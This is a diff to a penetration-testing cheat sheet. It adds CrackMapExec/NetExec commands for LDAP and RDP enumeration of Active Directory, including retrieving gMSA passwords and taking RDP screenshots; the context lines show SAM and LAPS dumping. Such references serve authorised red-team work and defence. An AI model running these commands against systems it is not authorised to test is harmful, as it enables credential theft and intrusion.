@@ -290,6 +290,7 @@ proxychains4 -q nxc smb $IP -u [user] -p [pass] -M drop-sc -o CLEANUP=True FILEN
 
 ## Admin Credentialed enumeration
 ### SMB options available with admin or non-admin account
+#### SMB Commands
 |Command|Description|
 |-------|-----------|
 |`crackmapexec smb <target> -u <u> -p <p> --loggedon-users`|Enumerate logged on users on the target|
@@ -326,6 +327,31 @@ nxc ldap $FQDN -u [user] -p [pass] -M laps
 * Run laps on multiple hosts and dumping sam
 ```bash
 nxc smb [host list .txt] -u [user] -p [pass] --laps --sam
+```
+### LDAP and RDP Enumeration
+#### LDAP & RDP Commands
+|Command|Description|
+|-------|-----------|
+|`crackmapexec ldap <target> -u <u> -p <p> --users`|Enumerate enabled domain users|
+|`crackmapexec ldap <target> -u <u> -p <p> --groups`|Enumerate domain groups|
+|`crackmapexec ldap <target> -u <u> -p <p> --password-not-required`|Get the list of users with flag PASSWD_NOTREQD|
+|`crackmapexec ldap <target> -u <u> -p <p> --trusted-for-delegation`|Get the list of users and computers with flag TRUSTED_FOR_DELEGATION|
+|`crackmapexec ldap <target> -u <u> -p <p> --admin-count`|Get objets that had the value adminCount=1|
+|`crackmapexec ldap <target> -u <u> -p <p> --get-sid`|Get domain sid|
+|`crackmapexec ldap <target> -u <u> -p <p> --gmsa`|Enumerate GMSA passwords|
+|`crackmapexec rdp <target> -u <u> -p <p> --nla-screenshot`|Screenshot RDP login prompt if NLA is disabled|
+|`crackmapexec rdp <target> -u <u> -p <p> --screenshot`|Screenshot RDP if connection success|
+|`crackmapexec rdp <target> -u <u> -p <p> --screentime SCREENTIME`|Time to wait for desktop image|
+|`crackmapexec rdp <target> -u <u> -p <p> --res RES`|Resolution in "WIDTHxHEIGHT" format. Default: "1024x768"|
+#### Group Managed Service Accounts
+* Enumeration
+```bash
+nxc winrm $FQDN -u [user] -p [pass] -X 'Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword'
+```
+* Retrieving gMSA passwords
+> must of an account with permissions, as enumerated above  
+```bash
+nxc ldap $FQDN -u [user] -p [pass] --gmsa
 ```
 
 ## Remote Shell
